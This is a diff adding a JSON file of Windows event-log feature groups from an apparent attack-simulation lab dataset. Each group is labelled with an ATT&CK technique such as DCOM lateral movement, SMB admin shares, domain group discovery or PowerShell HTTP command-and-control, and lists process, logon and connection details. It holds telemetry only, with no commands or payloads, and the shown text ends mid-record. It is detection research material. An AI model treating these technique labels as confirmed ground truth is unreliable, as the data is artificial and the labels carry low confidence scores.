@@ -1,0 +1,2635 @@
+[
+  {
+    "group_id": "T1021_003_33",
+    "technique_id": "T1021.003",
+    "technique_name": "Distributed Component Object Model",
+    "anchor_eid": 4624,
+    "anchor_detail": {
+      "eid": 4624,
+      "time": "2020-07-22 04:18:51+00:00",
+      "image": null,
+      "parent_image": null,
+      "cmdline": "",
+      "target_object": "",
+      "target_image": null,
+      "target_file": "",
+      "granted_access": null,
+      "query_name": null,
+      "dst_ip": null,
+      "dst_port": null,
+      "user": "-",
+      "integrity": null
+    },
+    "confidence": 0.44,
+    "all_idxs": [
+      27,
+      28,
+      33,
+      62,
+      66,
+      72,
+      74,
+      75,
+      76,
+      77,
+      78,
+      79,
+      80,
+      81,
+      82,
+      83,
+      84,
+      85,
+      86,
+      114,
+      115,
+      129,
+      130,
+      131,
+      152,
+      153,
+      154,
+      155,
+      156,
+      157,
+      158,
+      159,
+      160,
+      161,
+      162,
+      163,
+      164,
+      165,
+      166,
+      217,
+      457,
+      488,
+      490
+    ],
+    "features": {
+      "execution_context": {
+        "process_chains": [
+          {
+            "relation": "observed",
+            "child_image": "dns.exe",
+            "parent_image": null,
+            "source_eid": 3
+          },
+          {
+            "relation": "observed",
+            "child_image": "lsass.exe",
+            "parent_image": null,
+            "source_eid": 3
+          },
+          {
+            "relation": "observed",
+            "child_image": "System",
+            "parent_image": null,
+            "source_eid": 18
+          },
+          {
+            "relation": "observed",
+            "child_image": "svchost.exe",
+            "parent_image": null,
+            "source_eid": 3
+          }
+        ],
+        "chain_depth": 4
+      },
+      "command_script": {
+        "entries": [],
+        "has_obfuscation": false
+      },
+      "identity": {
+        "source_eid": 4624,
+        "user": "-",
+        "domain": "-",
+        "logon_id": "0x0",
+        "integrity_level": null,
+        "user_sid": "S-1-0-0",
+        "privilege_list": null
+      },
+      "temporal": {
+        "anchor_time": "2020-07-22T04:18:51+00:00",
+        "window_start_delta_sec": -1.0,
+        "window_end_delta_sec": 25.24,
+        "span_sec": 26.24,
+        "total_events": 43,
+        "event_density_per_10sec": 16.39,
+        "eid_counts": {
+          "3": 28,
+          "7": 8,
+          "18": 4,
+          "4624": 3
+        },
+        "inter_event_gap": {
+          "min_sec": 0.0,
+          "max_sec": 11.119,
+          "mean_sec": 0.625
+        },
+        "burst_detected": [
+          {
+            "eid": 3,
+            "count": 28,
+            "window_sec": 1.01
+          },
+          {
+            "eid": 7,
+            "count": 8,
+            "window_sec": 4.04
+          },
+          {
+            "eid": 18,
+            "count": 4,
+            "window_sec": 0.0
+          },
+          {
+            "eid": 4624,
+            "count": 3,
+            "window_sec": 0.01
+          }
+        ]
+      },
+      "network": {
+        "connections": [
+          {
+            "source_eid": 3,
+            "image": "dns.exe",
+            "src_ip": "172.18.38.5",
+            "dst_ip": "172.18.38.6",
+            "src_port": 53,
+            "dst_port": 49986,
+            "protocol": "udp",
+            "direction": "outbound",
+            "service_hint": null
+          },
+          {
+            "source_eid": 3,
+            "image": "dns.exe",
+            "src_ip": "172.18.38.5",
+            "dst_ip": "172.18.38.6",
+            "src_port": 53,
+            "dst_port": 65336,
+            "protocol": "udp",
+            "direction": "outbound",
+            "service_hint": null
+          },
+          {
+            "source_eid": 3,
+            "image": "lsass.exe",
+            "src_ip": "172.18.38.6",
+            "dst_ip": "172.18.38.5",
+            "src_port": 58086,
+            "dst_port": 49667,
+            "protocol": "tcp",
+            "direction": "outbound",
+            "service_hint": null
+          },
+          {
+            "source_eid": 3,
+            "image": "svchost.exe",
+            "src_ip": "172.18.38.6",
+            "dst_ip": "172.18.38.5",
+            "src_port": 58085,
+            "dst_port": 135,
+            "protocol": "tcp",
+            "direction": "outbound",
+            "service_hint": null
+          },
+          {
+            "source_eid": 3,
+            "image": "lsass.exe",
+            "src_ip": "172.18.38.5",
+            "dst_ip": "172.18.38.6",
+            "src_port": 389,
+            "dst_port": 65337,
+            "protocol": "udp",
+            "direction": "outbound",
+            "service_hint": null
+          },
+          {
+            "source_eid": 3,
+            "image": "lsass.exe",
+            "src_ip": "172.18.38.5",
+            "dst_ip": "172.18.38.6",
+            "src_port": 389,
+            "dst_port": 65338,
+            "protocol": "udp",
+            "direction": "outbound",
+            "service_hint": null
+          },
+          {
+            "source_eid": 3,
+            "image": "System",
+            "src_ip": "172.18.38.6",
+            "dst_ip": "172.18.38.5",
+            "src_port": 58087,
+            "dst_port": 445,
+            "protocol": "tcp",
+            "direction": "outbound",
+            "service_hint": "SMB"
+          },
+          {
+            "source_eid": 3,
+            "image": "lsass.exe",
+            "src_ip": "172.18.38.6",
+            "dst_ip": "172.18.38.5",
+            "src_port": 58088,
+            "dst_port": 389,
+            "protocol": "tcp",
+            "direction": "outbound",
+            "service_hint": null
+          },
+          {
+            "source_eid": 3,
+            "image": "lsass.exe",
+            "src_ip": "172.18.38.6",
+            "dst_ip": "172.18.38.5",
+            "src_port": 58089,
+            "dst_port": 389,
+            "protocol": "tcp",
+            "direction": "outbound",
+            "service_hint": null
+          },
+          {
+            "source_eid": 3,
+            "image": "lsass.exe",
+            "src_ip": "172.18.38.6",
+            "dst_ip": "172.18.38.5",
+            "src_port": 58090,
+            "dst_port": 389,
+            "protocol": "tcp",
+            "direction": "outbound",
+            "service_hint": null
+          },
+          {
+            "source_eid": 3,
+            "image": "dns.exe",
+            "src_ip": "172.18.38.5",
+            "dst_ip": "172.18.38.6",
+            "src_port": 53,
+            "dst_port": 54360,
+            "protocol": "udp",
+            "direction": "outbound",
+            "service_hint": null
+          },
+          {
+            "source_eid": 3,
+            "image": "lsass.exe",
+            "src_ip": "172.18.38.5",
+            "dst_ip": "172.18.38.6",
+            "src_port": 389,
+            "dst_port": 54361,
+            "protocol": "udp",
+            "direction": "outbound",
+            "service_hint": null
+          },
+          {
+            "source_eid": 3,
+            "image": "svchost.exe",
+            "src_ip": "0:0:0:0:0:0:0:1",
+            "dst_ip": "0:0:0:0:0:0:0:1",
+            "src_port": 53956,
+            "dst_port": 53,
+            "protocol": "udp",
+            "direction": "outbound",
+            "service_hint": "DNS"
+          },
+          {
+            "source_eid": 3,
+            "image": "dns.exe",
+            "src_ip": "0:0:0:0:0:0:0:1",
+            "dst_ip": "0:0:0:0:0:0:0:1",
+            "src_port": 53,
+            "dst_port": 53956,
+            "protocol": "udp",
+            "direction": "outbound",
+            "service_hint": null
+          },
+          {
+            "source_eid": 3,
+            "image": "dns.exe",
+            "src_ip": "0:0:0:0:0:0:0:1",
+            "dst_ip": "0:0:0:0:0:0:0:1",
+            "src_port": 53,
+            "dst_port": 55159,
+            "protocol": "udp",
+            "direction": "outbound",
+            "service_hint": null
+          },
+          {
+            "source_eid": 3,
+            "image": "svchost.exe",
+            "src_ip": "172.18.38.5",
+            "dst_ip": "172.18.38.6",
+            "src_port": 64872,
+            "dst_port": 5985,
+            "protocol": "tcp",
+            "direction": "outbound",
+            "service_hint": null
+          },
+          {
+            "source_eid": 3,
+            "image": "svchost.exe",
+            "src_ip": "172.18.38.5",
+            "dst_ip": "172.18.38.6",
+            "src_port": 64873,
+            "dst_port": 5985,
+            "protocol": "tcp",
+            "direction": "outbound",
+            "service_hint": null
+          },
+          {
+            "source_eid": 3,
+            "image": "svchost.exe",
+            "src_ip": "172.18.38.5",
+            "dst_ip": "172.18.38.6",
+            "src_port": 64876,
+            "dst_port": 5985,
+            "protocol": "tcp",
+            "direction": "outbound",
+            "service_hint": null
+          },
+          {
+            "source_eid": 3,
+            "image": "svchost.exe",
+            "src_ip": "172.18.38.5",
+            "dst_ip": "172.18.38.6",
+            "src_port": 64874,
+            "dst_port": 5985,
+            "protocol": "tcp",
+            "direction": "outbound",
+            "service_hint": null
+          },
+          {
+            "source_eid": 3,
+            "image": "svchost.exe",
+            "src_ip": "172.18.38.5",
+            "dst_ip": "172.18.38.6",
+            "src_port": 64875,
+            "dst_port": 5985,
+            "protocol": "tcp",
+            "direction": "outbound",
+            "service_hint": null
+          },
+          {
+            "source_eid": 3,
+            "image": "svchost.exe",
+            "src_ip": "172.18.38.5",
+            "dst_ip": "172.18.38.6",
+            "src_port": 64877,
+            "dst_port": 5985,
+            "protocol": "tcp",
+            "direction": "outbound",
+            "service_hint": null
+          },
+          {
+            "source_eid": 3,
+            "image": "svchost.exe",
+            "src_ip": "172.18.38.5",
+            "dst_ip": "172.18.38.6",
+            "src_port": 64882,
+            "dst_port": 5985,
+            "protocol": "tcp",
+            "direction": "outbound",
+            "service_hint": null
+          },
+          {
+            "source_eid": 3,
+            "image": "svchost.exe",
+            "src_ip": "172.18.38.5",
+            "dst_ip": "172.18.38.6",
+            "src_port": 64883,
+            "dst_port": 5985,
+            "protocol": "tcp",
+            "direction": "outbound",
+            "service_hint": null
+          },
+          {
+            "source_eid": 3,
+            "image": "svchost.exe",
+            "src_ip": "172.18.38.5",
+            "dst_ip": "172.18.38.6",
+            "src_port": 64881,
+            "dst_port": 5985,
+            "protocol": "tcp",
+            "direction": "outbound",
+            "service_hint": null
+          },
+          {
+            "source_eid": 3,
+            "image": "svchost.exe",
+            "src_ip": "172.18.38.5",
+            "dst_ip": "172.18.38.6",
+            "src_port": 64880,
+            "dst_port": 5985,
+            "protocol": "tcp",
+            "direction": "outbound",
+            "service_hint": null
+          },
+          {
+            "source_eid": 3,
+            "image": "svchost.exe",
+            "src_ip": "172.18.38.5",
+            "dst_ip": "172.18.38.6",
+            "src_port": 64879,
+            "dst_port": 5985,
+            "protocol": "tcp",
+            "direction": "outbound",
+            "service_hint": null
+          },
+          {
+            "source_eid": 3,
+            "image": "svchost.exe",
+            "src_ip": "172.18.38.5",
+            "dst_ip": "172.18.38.6",
+            "src_port": 64878,
+            "dst_port": 5985,
+            "protocol": "tcp",
+            "direction": "outbound",
+            "service_hint": null
+          },
+          {
+            "source_eid": 3,
+            "image": "svchost.exe",
+            "src_ip": "172.18.38.5",
+            "dst_ip": "172.18.38.6",
+            "src_port": 64884,
+            "dst_port": 5985,
+            "protocol": "tcp",
+            "direction": "outbound",
+            "service_hint": null
+          }
+        ]
+      },
+      "persistence": {
+        "registry_signals": [],
+        "registry_noise": [],
+        "registry_noise_count": 0,
+        "dropped_files": []
+      },
+      "evasion": {
+        "log_cleared": [],
+        "deleted_files": [],
+        "obfuscated_cmdlines": []
+      }
+    }
+  },
+  {
+    "group_id": "T1021_003_549",
+    "technique_id": "T1021.003",
+    "technique_name": "Distributed Component Object Model",
+    "anchor_eid": 4624,
+    "anchor_detail": {
+      "eid": 4624,
+      "time": "2020-07-22 04:19:25.306000+00:00",
+      "image": null,
+      "parent_image": null,
+      "cmdline": "",
+      "target_object": "",
+      "target_image": null,
+      "target_file": "",
+      "granted_access": null,
+      "query_name": null,
+      "dst_ip": null,
+      "dst_port": null,
+      "user": "-",
+      "integrity": null
+    },
+    "confidence": 0.67,
+    "all_idxs": [
+      490,
+      549,
+      568,
+      569,
+      634,
+      636
+    ],
+    "features": {
+      "execution_context": {
+        "process_chains": [
+          {
+            "relation": "observed",
+            "child_image": "svchost.exe",
+            "parent_image": null,
+            "source_eid": 7
+          },
+          {
+            "relation": "observed",
+            "child_image": "Microsoft.ActiveDirectory.WebServices.exe",
+            "parent_image": null,
+            "source_eid": 3
+          },
+          {
+            "relation": "observed",
+            "child_image": "lsass.exe",
+            "parent_image": null,
+            "source_eid": 3
+          }
+        ],
+        "chain_depth": 3
+      },
+      "command_script": {
+        "entries": [],
+        "has_obfuscation": false
+      },
+      "identity": {
+        "source_eid": 4624,
+        "user": "-",
+        "domain": "-",
+        "logon_id": "0x0",
+        "integrity_level": null,
+        "user_sid": "S-1-0-0",
+        "privilege_list": null
+      },
+      "temporal": {
+        "anchor_time": "2020-07-22T04:19:25.306000+00:00",
+        "window_start_delta_sec": -9.07,
+        "window_end_delta_sec": 10.05,
+        "span_sec": 19.12,
+        "total_events": 6,
+        "event_density_per_10sec": 3.14,
+        "eid_counts": {
+          "7": 3,
+          "3": 2,
+          "4624": 1
+        },
+        "inter_event_gap": {
+          "min_sec": 0.0,
+          "max_sec": 9.067,
+          "mean_sec": 3.824
+        },
+        "burst_detected": []
+      },
+      "network": {
+        "connections": [
+          {
+            "source_eid": 3,
+            "image": "Microsoft.ActiveDirectory.WebServices.exe",
+            "src_ip": "0:0:0:0:0:0:0:1",
+            "dst_ip": "0:0:0:0:0:0:0:1",
+            "src_port": 64885,
+            "dst_port": 389,
+            "protocol": "tcp",
+            "direction": "outbound",
+            "service_hint": null
+          },
+          {
+            "source_eid": 3,
+            "image": "lsass.exe",
+            "src_ip": "0:0:0:0:0:0:0:1",
+            "dst_ip": "0:0:0:0:0:0:0:1",
+            "src_port": 64885,
+            "dst_port": 389,
+            "protocol": "tcp",
+            "direction": "outbound",
+            "service_hint": null
+          }
+        ]
+      },
+      "persistence": {
+        "registry_signals": [],
+        "registry_noise": [],
+        "registry_noise_count": 0,
+        "dropped_files": []
+      },
+      "evasion": {
+        "log_cleared": [],
+        "deleted_files": [],
+        "obfuscated_cmdlines": []
+      }
+    }
+  },
+  {
+    "group_id": "T1021_002_40",
+    "technique_id": "T1021.002",
+    "technique_name": "SMB/Windows Admin Shares",
+    "anchor_eid": 5140,
+    "anchor_detail": {
+      "eid": 5140,
+      "time": "2020-07-22 04:18:51.001000+00:00",
+      "image": null,
+      "parent_image": null,
+      "cmdline": "",
+      "target_object": "",
+      "target_image": null,
+      "target_file": "",
+      "granted_access": null,
+      "query_name": null,
+      "dst_ip": null,
+      "dst_port": null,
+      "user": "WEC$",
+      "integrity": null
+    },
+    "confidence": 0.33,
+    "all_idxs": [
+      33,
+      40,
+      41,
+      46,
+      51,
+      62,
+      66,
+      68,
+      74,
+      75,
+      76,
+      77
+    ],
+    "features": {
+      "execution_context": {
+        "process_chains": [
+          {
+            "relation": "observed",
+            "child_image": "System",
+            "parent_image": null,
+            "source_eid": 18
+          }
+        ],
+        "chain_depth": 1
+      },
+      "command_script": {
+        "entries": [],
+        "has_obfuscation": false
+      },
+      "identity": {
+        "source_eid": 4624,
+        "user": "-",
+        "domain": "-",
+        "logon_id": "0x0",
+        "integrity_level": null,
+        "user_sid": "S-1-0-0",
+        "privilege_list": null
+      },
+      "temporal": {
+        "anchor_time": "2020-07-22T04:18:51.001000+00:00",
+        "window_start_delta_sec": -0.0,
+        "window_end_delta_sec": 0.01,
+        "span_sec": 0.01,
+        "total_events": 12,
+        "event_density_per_10sec": null,
+        "eid_counts": {
+          "5145": 4,
+          "18": 4,
+          "4624": 3,
+          "5140": 1
+        },
+        "inter_event_gap": {
+          "min_sec": 0.0,
+          "max_sec": 0.002,
+          "mean_sec": 0.001
+        },
+        "burst_detected": [
+          {
+            "eid": 5145,
+            "count": 4,
+            "window_sec": 0.0
+          },
+          {
+            "eid": 18,
+            "count": 4,
+            "window_sec": 0.0
+          },
+          {
+            "eid": 4624,
+            "count": 3,
+            "window_sec": 0.01
+          }
+        ]
+      },
+      "network": {
+        "connections": []
+      },
+      "persistence": {
+        "registry_signals": [],
+        "registry_noise": [],
+        "registry_noise_count": 0,
+        "dropped_files": []
+      },
+      "evasion": {
+        "log_cleared": [],
+        "deleted_files": [],
+        "obfuscated_cmdlines": []
+      }
+    }
+  },
+  {
+    "group_id": "T1069_002_50",
+    "technique_id": "T1069.002",
+    "technique_name": "Domain Groups Discovery",
+    "anchor_eid": 4661,
+    "anchor_detail": {
+      "eid": 4661,
+      "time": "2020-07-22 04:18:51.002000+00:00",
+      "image": null,
+      "parent_image": null,
+      "cmdline": "",
+      "target_object": "",
+      "target_image": null,
+      "target_file": "",
+      "granted_access": null,
+      "query_name": null,
+      "dst_ip": null,
+      "dst_port": null,
+      "user": "WEC$",
+      "integrity": null
+    },
+    "confidence": 1.0,
+    "all_idxs": [
+      27,
+      28,
+      50,
+      72,
+      78,
+      79,
+      80,
+      81,
+      82,
+      83,
+      84,
+      85,
+      86,
+      129,
+      130,
+      131,
+      155,
+      156,
+      157,
+      158,
+      159,
+      160,
+      161,
+      162,
+      163,
+      164,
+      165,
+      166,
+      457
+    ],
+    "features": {
+      "execution_context": {
+        "process_chains": [
+          {
+            "relation": "observed",
+            "child_image": "dns.exe",
+            "parent_image": null,
+            "source_eid": 3
+          },
+          {
+            "relation": "observed",
+            "child_image": "lsass.exe",
+            "parent_image": null,
+            "source_eid": 3
+          },
+          {
+            "relation": "observed",
+            "child_image": "svchost.exe",
+            "parent_image": null,
+            "source_eid": 3
+          },
+          {
+            "relation": "observed",
+            "child_image": "System",
+            "parent_image": null,
+            "source_eid": 3
+          }
+        ],
+        "chain_depth": 4
+      },
+      "command_script": {
+        "entries": [],
+        "has_obfuscation": false
+      },
+      "identity": {
+        "source_eid": 3,
+        "user": "NT AUTHORITY\\SYSTEM",
+        "domain": "NT AUTHORITY",
+        "logon_id": null,
+        "integrity_level": null,
+        "user_sid": null,
+        "privilege_list": null
+      },
+      "temporal": {
+        "anchor_time": "2020-07-22T04:18:51.002000+00:00",
+        "window_start_delta_sec": -1.0,
+        "window_end_delta_sec": 21.22,
+        "span_sec": 22.22,
+        "total_events": 29,
+        "event_density_per_10sec": 13.05,
+        "eid_counts": {
+          "3": 28,
+          "4661": 1
+        },
+        "inter_event_gap": {
+          "min_sec": 0.0,
+          "max_sec": 13.148,
+          "mean_sec": 0.794
+        },
+        "burst_detected": [
+          {
+            "eid": 3,
+            "count": 28,
+            "window_sec": 1.01
+          }
+        ]
+      },
+      "network": {
+        "connections": [
+          {
+            "source_eid": 3,
+            "image": "dns.exe",
+            "src_ip": "172.18.38.5",
+            "dst_ip": "172.18.38.6",
+            "src_port": 53,
+            "dst_port": 49986,
+            "protocol": "udp",
+            "direction": "outbound",
+            "service_hint": null
+          },
+          {
+            "source_eid": 3,
+            "image": "dns.exe",
+            "src_ip": "172.18.38.5",
+            "dst_ip": "172.18.38.6",
+            "src_port": 53,
+            "dst_port": 65336,
+            "protocol": "udp",
+            "direction": "outbound",
+            "service_hint": null
+          },
+          {
+            "source_eid": 3,
+            "image": "lsass.exe",
+            "src_ip": "172.18.38.6",
+            "dst_ip": "172.18.38.5",
+            "src_port": 58086,
+            "dst_port": 49667,
+            "protocol": "tcp",
+            "direction": "outbound",
+            "service_hint": null
+          },
+          {
+            "source_eid": 3,
+            "image": "svchost.exe",
+            "src_ip": "172.18.38.6",
+            "dst_ip": "172.18.38.5",
+            "src_port": 58085,
+            "dst_port": 135,
+            "protocol": "tcp",
+            "direction": "outbound",
+            "service_hint": null
+          },
+          {
+            "source_eid": 3,
+            "image": "lsass.exe",
+            "src_ip": "172.18.38.5",
+            "dst_ip": "172.18.38.6",
+            "src_port": 389,
+            "dst_port": 65337,
+            "protocol": "udp",
+            "direction": "outbound",
+            "service_hint": null
+          },
+          {
+            "source_eid": 3,
+            "image": "lsass.exe",
+            "src_ip": "172.18.38.5",
+            "dst_ip": "172.18.38.6",
+            "src_port": 389,
+            "dst_port": 65338,
+            "protocol": "udp",
+            "direction": "outbound",
+            "service_hint": null
+          },
+          {
+            "source_eid": 3,
+            "image": "System",
+            "src_ip": "172.18.38.6",
+            "dst_ip": "172.18.38.5",
+            "src_port": 58087,
+            "dst_port": 445,
+            "protocol": "tcp",
+            "direction": "outbound",
+            "service_hint": "SMB"
+          },
+          {
+            "source_eid": 3,
+            "image": "lsass.exe",
+            "src_ip": "172.18.38.6",
+            "dst_ip": "172.18.38.5",
+            "src_port": 58088,
+            "dst_port": 389,
+            "protocol": "tcp",
+            "direction": "outbound",
+            "service_hint": null
+          },
+          {
+            "source_eid": 3,
+            "image": "lsass.exe",
+            "src_ip": "172.18.38.6",
+            "dst_ip": "172.18.38.5",
+            "src_port": 58089,
+            "dst_port": 389,
+            "protocol": "tcp",
+            "direction": "outbound",
+            "service_hint": null
+          },
+          {
+            "source_eid": 3,
+            "image": "lsass.exe",
+            "src_ip": "172.18.38.6",
+            "dst_ip": "172.18.38.5",
+            "src_port": 58090,
+            "dst_port": 389,
+            "protocol": "tcp",
+            "direction": "outbound",
+            "service_hint": null
+          },
+          {
+            "source_eid": 3,
+            "image": "dns.exe",
+            "src_ip": "172.18.38.5",
+            "dst_ip": "172.18.38.6",
+            "src_port": 53,
+            "dst_port": 54360,
+            "protocol": "udp",
+            "direction": "outbound",
+            "service_hint": null
+          },
+          {
+            "source_eid": 3,
+            "image": "lsass.exe",
+            "src_ip": "172.18.38.5",
+            "dst_ip": "172.18.38.6",
+            "src_port": 389,
+            "dst_port": 54361,
+            "protocol": "udp",
+            "direction": "outbound",
+            "service_hint": null
+          },
+          {
+            "source_eid": 3,
+            "image": "svchost.exe",
+            "src_ip": "0:0:0:0:0:0:0:1",
+            "dst_ip": "0:0:0:0:0:0:0:1",
+            "src_port": 53956,
+            "dst_port": 53,
+            "protocol": "udp",
+            "direction": "outbound",
+            "service_hint": "DNS"
+          },
+          {
+            "source_eid": 3,
+            "image": "dns.exe",
+            "src_ip": "0:0:0:0:0:0:0:1",
+            "dst_ip": "0:0:0:0:0:0:0:1",
+            "src_port": 53,
+            "dst_port": 53956,
+            "protocol": "udp",
+            "direction": "outbound",
+            "service_hint": null
+          },
+          {
+            "source_eid": 3,
+            "image": "dns.exe",
+            "src_ip": "0:0:0:0:0:0:0:1",
+            "dst_ip": "0:0:0:0:0:0:0:1",
+            "src_port": 53,
+            "dst_port": 55159,
+            "protocol": "udp",
+            "direction": "outbound",
+            "service_hint": null
+          },
+          {
+            "source_eid": 3,
+            "image": "svchost.exe",
+            "src_ip": "172.18.38.5",
+            "dst_ip": "172.18.38.6",
+            "src_port": 64872,
+            "dst_port": 5985,
+            "protocol": "tcp",
+            "direction": "outbound",
+            "service_hint": null
+          },
+          {
+            "source_eid": 3,
+            "image": "svchost.exe",
+            "src_ip": "172.18.38.5",
+            "dst_ip": "172.18.38.6",
+            "src_port": 64873,
+            "dst_port": 5985,
+            "protocol": "tcp",
+            "direction": "outbound",
+            "service_hint": null
+          },
+          {
+            "source_eid": 3,
+            "image": "svchost.exe",
+            "src_ip": "172.18.38.5",
+            "dst_ip": "172.18.38.6",
+            "src_port": 64876,
+            "dst_port": 5985,
+            "protocol": "tcp",
+            "direction": "outbound",
+            "service_hint": null
+          },
+          {
+            "source_eid": 3,
+            "image": "svchost.exe",
+            "src_ip": "172.18.38.5",
+            "dst_ip": "172.18.38.6",
+            "src_port": 64874,
+            "dst_port": 5985,
+            "protocol": "tcp",
+            "direction": "outbound",
+            "service_hint": null
+          },
+          {
+            "source_eid": 3,
+            "image": "svchost.exe",
+            "src_ip": "172.18.38.5",
+            "dst_ip": "172.18.38.6",
+            "src_port": 64875,
+            "dst_port": 5985,
+            "protocol": "tcp",
+            "direction": "outbound",
+            "service_hint": null
+          },
+          {
+            "source_eid": 3,
+            "image": "svchost.exe",
+            "src_ip": "172.18.38.5",
+            "dst_ip": "172.18.38.6",
+            "src_port": 64877,
+            "dst_port": 5985,
+            "protocol": "tcp",
+            "direction": "outbound",
+            "service_hint": null
+          },
+          {
+            "source_eid": 3,
+            "image": "svchost.exe",
+            "src_ip": "172.18.38.5",
+            "dst_ip": "172.18.38.6",
+            "src_port": 64882,
+            "dst_port": 5985,
+            "protocol": "tcp",
+            "direction": "outbound",
+            "service_hint": null
+          },
+          {
+            "source_eid": 3,
+            "image": "svchost.exe",
+            "src_ip": "172.18.38.5",
+            "dst_ip": "172.18.38.6",
+            "src_port": 64883,
+            "dst_port": 5985,
+            "protocol": "tcp",
+            "direction": "outbound",
+            "service_hint": null
+          },
+          {
+            "source_eid": 3,
+            "image": "svchost.exe",
+            "src_ip": "172.18.38.5",
+            "dst_ip": "172.18.38.6",
+            "src_port": 64881,
+            "dst_port": 5985,
+            "protocol": "tcp",
+            "direction": "outbound",
+            "service_hint": null
+          },
+          {
+            "source_eid": 3,
+            "image": "svchost.exe",
+            "src_ip": "172.18.38.5",
+            "dst_ip": "172.18.38.6",
+            "src_port": 64880,
+            "dst_port": 5985,
+            "protocol": "tcp",
+            "direction": "outbound",
+            "service_hint": null
+          },
+          {
+            "source_eid": 3,
+            "image": "svchost.exe",
+            "src_ip": "172.18.38.5",
+            "dst_ip": "172.18.38.6",
+            "src_port": 64879,
+            "dst_port": 5985,
+            "protocol": "tcp",
+            "direction": "outbound",
+            "service_hint": null
+          },
+          {
+            "source_eid": 3,
+            "image": "svchost.exe",
+            "src_ip": "172.18.38.5",
+            "dst_ip": "172.18.38.6",
+            "src_port": 64878,
+            "dst_port": 5985,
+            "protocol": "tcp",
+            "direction": "outbound",
+            "service_hint": null
+          },
+          {
+            "source_eid": 3,
+            "image": "svchost.exe",
+            "src_ip": "172.18.38.5",
+            "dst_ip": "172.18.38.6",
+            "src_port": 64884,
+            "dst_port": 5985,
+            "protocol": "tcp",
+            "direction": "outbound",
+            "service_hint": null
+          }
+        ]
+      },
+      "persistence": {
+        "registry_signals": [],
+        "registry_noise": [],
+        "registry_noise_count": 0,
+        "dropped_files": []
+      },
+      "evasion": {
+        "log_cleared": [],
+        "deleted_files": [],
+        "obfuscated_cmdlines": []
+      }
+    }
+  },
+  {
+    "group_id": "T1071_001_87",
+    "technique_id": "T1071.001",
+    "technique_name": "Web Protocols",
+    "anchor_eid": 3,
+    "anchor_detail": {
+      "eid": 3,
+      "time": "2020-07-22 04:18:53.020000+00:00",
+      "image": "powershell.exe",
+      "parent_image": null,
+      "cmdline": "",
+      "target_object": "",
+      "target_image": null,
+      "target_file": "",
+      "granted_access": null,
+      "query_name": null,
+      "dst_ip": "10.10.10.5",
+      "dst_port": "80",
+      "user": "MORDOR\\pgustavo",
+      "integrity": null
+    },
+    "confidence": 0.67,
+    "all_idxs": [
+      29,
+      31,
+      37,
+      87,
+      91,
+      92,
+      111,
+      116,
+      118,
+      128,
+      188,
+      189,
+      190,
+      192,
+      194,
+      223,
+      224,
+      229,
+      232,
+      279,
+      282,
+      283,
+      284,
+      287,
+      295,
+      421,
+      422,
+      426,
+      427,
+      429,
+      430,
+      450,
+      451,
+      452,
+      453,
+      454,
+      467,
+      468,
+      470,
+      489,
+      491,
+      492,
+      495,
+      496,
+      516,
+      517,
+      518,
+      528,
+      534,
+      535,
+      563,
+      564,
+      566,
+      579,
+      582,
+      585,
+      608,
+      609,
+      610,
+      613,
+      614,
+      615,
+      616,
+      617,
+      643,
+      646,
+      647
+    ],
+    "features": {
+      "execution_context": {
+        "process_chains": [
+          {
+            "relation": "observed",
+            "child_image": "powershell.exe",
+            "parent_image": null,
+            "source_eid": 5158
+          },
+          {
+            "relation": "observed",
+            "child_image": "networkwatcheragent.exe",
+            "parent_image": null,
+            "source_eid": 5156
+          },
+          {
+            "relation": "observed",
+            "child_image": "svchost.exe",
+            "parent_image": null,
+            "source_eid": 13
+          }
+        ],
+        "chain_depth": 3
+      },
+      "command_script": {
+        "entries": [],
+        "has_obfuscation": false
+      },
+      "identity": {
+        "source_eid": 3,
+        "user": "MORDOR\\pgustavo",
+        "domain": "NT AUTHORITY",
+        "logon_id": null,
+        "integrity_level": null,
+        "user_sid": null,
+        "privilege_list": null
+      },
+      "temporal": {
+        "anchor_time": "2020-07-22T04:18:53.020000+00:00",
+        "window_start_delta_sec": -3.02,
+        "window_end_delta_sec": 43.34,
+        "span_sec": 46.36,
+        "total_events": 67,
+        "event_density_per_10sec": 14.45,
+        "eid_counts": {
+          "5156": 21,
+          "5158": 14,
+          "12": 13,
+          "3": 13,
+          "13": 6
+        },
+        "inter_event_gap": {
+          "min_sec": 0.0,
+          "max_sec": 4.035,
+          "mean_sec": 0.702
+        },
+        "burst_detected": [
+          {
+            "eid": 5156,
+            "count": 21,
+            "window_sec": 4.03
+          },
+          {
+            "eid": 5158,
+            "count": 14,
+            "window_sec": 6.08
+          },
+          {
+            "eid": 12,
+            "count": 13,
+            "window_sec": 9.08
+          },
+          {
+            "eid": 3,
+            "count": 13,
+            "window_sec": 8.07
+          },
+          {
+            "eid": 13,
+            "count": 6,
+            "window_sec": 5.05
+          }
+        ]
+      },
+      "network": {
+        "connections": [
+          {
+            "source_eid": 5158,
+            "image": "powershell.exe",
+            "src_ip": "0.0.0.0",
+            "dst_ip": null,
+            "src_port": 51070,
+            "dst_port": null,
+            "protocol": "TCP",
+            "direction": "listen",
+            "service_hint": null,
+            "listen_port": 51070
+          },
+          {
+            "source_eid": 5156,
+            "image": "powershell.exe",
+            "src_ip": "172.18.39.5",
+            "dst_ip": "10.10.10.5",
+            "src_port": 51070,
+            "dst_port": 80,
+            "protocol": "TCP",
+            "direction": "outbound",
+            "service_hint": "HTTP"
+          },
+          {
+            "source_eid": 3,
+            "image": "powershell.exe",
+            "src_ip": "172.18.39.5",
+            "dst_ip": "10.10.10.5",
+            "src_port": 51070,
+            "dst_port": 80,
+            "protocol": "tcp",
+            "direction": "outbound",
+            "service_hint": "HTTP"
+          },
+          {
+            "source_eid": 5156,
+            "image": "networkwatcheragent.exe",
+            "src_ip": "172.18.39.5",
+            "dst_ip": "169.254.169.254",
+            "src_port": 49988,
+            "dst_port": 80,
+            "protocol": "TCP",
+            "direction": "outbound",
+            "service_hint": "HTTP"
+          },
+          {
+            "source_eid": 5156,
+            "image": "networkwatcheragent.exe",
+            "src_ip": "172.18.39.5",
+            "dst_ip": "169.254.169.254",
+            "src_port": 49988,
+            "dst_port": 80,
+            "protocol": "TCP",
+            "direction": "outbound",
+            "service_hint": "HTTP"
+          },
+          {
+            "source_eid": 5156,
+            "image": "powershell.exe",
+            "src_ip": "172.18.39.5",
+            "dst_ip": "10.10.10.5",
+            "src_port": 51071,
+            "dst_port": 80,
+            "protocol": "TCP",
+            "direction": "outbound",
+            "service_hint": "HTTP"
+          },
+          {
+            "source_eid": 5158,
+            "image": "powershell.exe",
+            "src_ip": "0.0.0.0",
+            "dst_ip": null,
+            "src_port": 51071,
+            "dst_port": null,
+            "protocol": "TCP",
+            "direction": "listen",
